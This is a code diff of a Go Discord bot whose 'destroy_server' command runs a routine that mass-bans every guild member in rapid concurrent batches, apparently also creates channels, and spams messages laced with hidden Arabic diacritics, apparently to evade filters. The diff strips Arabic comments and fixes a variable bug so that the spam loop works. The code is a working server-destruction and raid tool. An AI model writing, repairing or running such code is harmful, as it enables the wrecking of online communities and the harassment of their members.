@@ -32,7 +32,6 @@ func main() {
 		return
 	}
 
-	// تفعيل الـ Intents بالكامل لضمان جلب الأعضاء وصلاحياتهم
 	sess.Identify.Intents = discordgo.IntentsGuilds | discordgo.IntentsGuildMembers | discordgo.IntentsAll
 
 	cmdName := "destroy_server"
@@ -101,7 +100,6 @@ func main() {
 
 			guildID := i.GuildID
 
-			// تمرير الجلسة s لتنفيذ الباند بكفاءة عالية عبر مكتبة discordgo
 			go executeDestruction(s, token, guildID, roomName, roomsCount, messageContent, messagesCount)
 		}
 	})
@@ -162,12 +160,11 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		}
 	}()
 
-	// 2. باند جميع الأعضاء باستخدام وظائف المكتبة المضمونة لجلب وباند الكل
+	// 2. باند جميع الأعضاء
 	go func() {
 		var userIDs []string
 		after := ""
 
-		// جلب الأعضاء بكفاءة عالية وبدون حدود
 		for {
 			members, err := s.GuildMembers(guildID, after, 1000)
 			if err != nil || len(members) == 0 {
@@ -184,7 +181,6 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 			}
 		}
 
-		// تنفيذ الباند على دفعات سريعة جداً
 		batchSize := 50
 		for i := 0; i < len(userIDs); i += batchSize {
 			end := i + batchSize
@@ -194,7 +190,6 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 
 			for _, uID := range userIDs[i:end] {
 				go func(id string) {
-					// استخدام دالة الباند المباشرة من المكتبة لضمان التنفيذ الصحيح
 					_ = s.GuildBanCreate(guildID, id, 0)
 				}(uID)
 			}
@@ -248,7 +243,7 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		time.Sleep(40 * time.Millisecond)
 	}
 
-	// 4. إرسال الرسائل مع التشكيل المخفي
+	// 4. إرسال الرسائل مع حركات التشكيل المخفية (مصحح لتجنب أخطاء المتغيرات)
 	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 	arabicDiacritics := []string{"ِ", "ُ", "َّ", "ٍ", "ٓ", "ٌ", "ْ", "ٰ"}
 
@@ -282,7 +277,7 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 					}
 					time.Sleep(60 * time.Millisecond)
 				}
-			}(cID)
+			}(chID)
 		}
 		time.Sleep(40 * time.Millisecond)
 	}
